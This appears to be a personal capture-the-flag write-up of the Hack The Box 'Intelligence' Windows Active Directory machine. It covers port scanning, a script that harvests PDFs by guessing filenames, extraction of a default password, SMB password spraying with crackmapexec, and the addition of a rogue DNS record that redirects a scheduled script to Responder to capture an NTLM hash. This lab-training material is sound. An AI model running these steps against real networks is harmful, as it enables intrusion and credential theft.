# Intelligence

Tags: Active Directory
Type: Windows

# Enumeration

portscan 

```bash
# Nmap 7.91 scan initiated Sun Oct 24 01:08:55 2021 as: nmap -p53,88,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49702,49714,56625 -sV -sC -T4 -Pn -oA 10.10.10.248 10.10.10.248
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-24 12:09:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-24T12:10:41+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-24T12:10:39+00:00; +7h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-24T12:10:41+00:00; +7h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-24T12:10:39+00:00; +7h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
56625/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-24T12:10:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 24 01:10:39 2021 -- 1 IP address (1 host up) scanned in 104.59 seconds
```

- we get two user names from the pdfs

```bash
exiftool firstpdf.pdf
```

- we get the names â†’ Jose.Williams & William.Lee
- we create a wordlist from the variations of these names
    - used [bopscrk.py](http://bopscrk.py) to create a custom wordlist
- then we enumerate it with kerbrute and get these user names

> William.Lee@intelligence.htb
Administrator@intelligence.htb
> 
- the script I used to check if there are other pdf files available on the server by changing the file name

```python
#!/usr/bin/env python3

import requests
import os

date = 1
month = 1
year = 2010

for i in range(1,31): 
    for j in range(1,13): 
        for k in range(2020,2022): 
            temp_i = i
            temp_j = j
            temp_k = k
            if i < 10: 
               temp_i = '0' + str(i)
            if j < 10: 
               temp_j = '0' + str(j)
            check_string = str(temp_k) + "-" + str(temp_j) + "-" + str(temp_i) + "-upload.pdf"
            r = requests.get('http://intelligence.htb/documents/%s'%check_string)
            if r.status_code == 200: 
                os.system(f'wget http://intelligence.htb/documents/{check_string} -O /home/kali/htb/intelligence/pdf/{check_string}')
                print(check_string)
```

- then I modified the script a bit to run exiftool and extract all usernames from the pdf files and tested those using `NPUsers.py`
- Nothing interesting found yet.
- Next, I created another script to check the downloaded pdfs for any username or passwords in their contents

# Initial Access

```python
#!/usr/bin/env python3

import textract

files = []

pdf_file_obj = open('pdf.txt', 'r')
files = pdf_file_obj.read().splitlines()
pdf_file_obj.close()

the_word = 'user'

for i in files: 
    text = textract.process(f'/home/kali/htb/intelligence/pdf/{i}')
    if the_word in str(text):
        print(str(text))
```

- Found a password

```
b'New Account Guide\n\nWelcome to Intelligence Corp!\nPlease login using your username and the default password of:\nNewIntelligenceCorpUser9876\n\nAfter logging in please change your password as soon as possible.\n\n\x0c'
```

- using crackmapexec with the extracted users list and the default password from above to find smb users with this password

```bash
crackmapexec smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876'
```

- found one user with this password

```bash
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

- Listed some shares

```bash
[kali@kali] [~/htb/intelligence] $ smbclient -L \\\\intelligence.htb\\ -U Tiffany.Molina   
Enter WORKGROUP\Tiffany.Molina's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

- found a script `downdetector.ps1` in the IT share
- Got access to C:\Users directory from Users share

# Privilege Escalation

- the `downdetector.ps1` script is checking any DNS beginning with 'web' is alive or not and sending a mail to Ted.Graves using the "default credentials" if it's not
- we can get Ted's NTLM hash
    - Setting up Responder to receive the hash
    - Using dnstool to add a DNS record with Tiffany.Molina's creds
    
    ```bash
    python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'websomething.intelligence.htb' -d <attacking-ip/responder-ip> <victim-ip>
    ```
    

## Notes

-